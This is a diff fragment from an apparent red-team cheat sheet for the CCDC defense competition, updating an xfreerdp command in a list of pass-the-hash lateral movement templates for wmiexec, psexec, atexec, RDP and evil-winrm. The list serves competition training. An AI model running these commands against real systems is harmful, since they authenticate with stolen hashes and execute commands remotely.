@@ -28,7 +28,7 @@ pagetitle: Red Teaming for CCDC
   - 135 - use `wmiexec.py -hashes :{hash} '{domain}/{user}@{ip}'`
   - 139/445 - use `psexec.py -hashes :{hash} '{domain}/{user}@{ip}'` or `smbexec`
   - 593 - use `atexec.py -hashes :{hash} '{domain}/{user}@{ip}' "{command}"`
-  - 3389 - user `xfreerdp /u:{user} /d:{domain} /pth:{hash} /v:{IP}`
+  - 3389 - user `xfreerdp3 /u:{user} /d:{domain} /pth:{hash} /v:{IP}`
     - `/p:{password}` if we have it
   - 5985 - use `evil-winrm -i {IP} -u '{domain}\{username}' -H {hash} -r {domain}`
     - `-r` optional, used for kerberos
